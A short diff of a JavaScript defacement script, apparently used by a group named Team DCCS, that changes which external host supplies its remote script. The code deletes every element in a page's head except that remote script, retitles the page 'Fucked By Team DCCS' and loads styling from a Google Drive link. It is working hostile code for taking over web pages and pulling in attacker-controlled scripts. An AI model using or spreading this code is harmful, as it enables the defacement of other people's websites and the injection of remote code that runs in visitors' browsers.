@@ -1,4 +1,4 @@
-document.head.querySelectorAll(':not(script[src="https://cdn.teamdccs.xyz/puk/script.js"])').forEach(element => element.remove());
+document.head.querySelectorAll(':not(script[src="https://saimonk112.github.io/script.js"])').forEach(element => element.remove());
 document.head.innerHTML += '<title>Fucked By Team DCCS</title>';
 document.head.innerHTML += "<link href='http://fonts.googleapis.com/css?family=Orbitron:700' rel='stylesheet' type='text/css'>";
 document.head.innerHTML += "<link href='https://drive.google.com/uc?export=download&id=0B-esUepE3mJId0F2R3E5Q3J6Wk0' rel='stylesheet' type='text/css'>";
